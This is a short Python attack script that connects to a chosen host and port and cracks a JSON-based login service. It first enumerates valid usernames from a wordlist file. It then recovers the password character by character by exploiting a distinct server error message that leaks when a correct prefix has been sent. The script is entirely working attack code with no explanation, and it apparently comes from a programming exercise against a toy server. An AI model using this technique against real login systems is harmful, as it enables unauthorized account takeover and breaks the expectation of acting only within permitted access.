import argparse
import socket
from json import loads, dumps
from string import ascii_letters, digits
from time import perf_counter


def new_login():
    with open("C:\logins.txt", "r") as temp_login:
        for line in temp_login:
            word = line.strip()
            yield word


parser = argparse.ArgumentParser()
parser.add_argument("host", help="Enter IP address")
parser.add_argument("port", help="Enter port from 1024 to 65535")

args = parser.parse_args()

ip_address = args.host
port = int(args.port)
address = (ip_address, port)
login = new_login()
response = {"result": ""}

correct_login = None
password = ""

with socket.socket() as client_socket:
    x = 0
    char_list = list(ascii_letters) + list(digits)

    client_socket.connect(address)

    while response["result"] != "Wrong password!":
        correct_login = str(next(login))
        date_dict = {"login": correct_login, "password": " "}

        data = dumps(date_dict).encode()
        client_socket.send(data)
        response = loads(client_socket.recv(1024).decode())

    while True:
        date_dict = {"login": correct_login, "password": password + str(char_list[x])}

        if response["result"] == "Wrong password!":
            data = dumps(date_dict).encode()
            client_socket.send(data)
            response = loads(client_socket.recv(1024).decode())
        if response["result"] == "Exception happened during login":
            password += str(char_list[x])
            x = 0
            response = {"result": "Wrong password!"}
        elif response["result"] == "Connection success!":
            print(dumps(date_dict))
            break
        else:
            x += 1
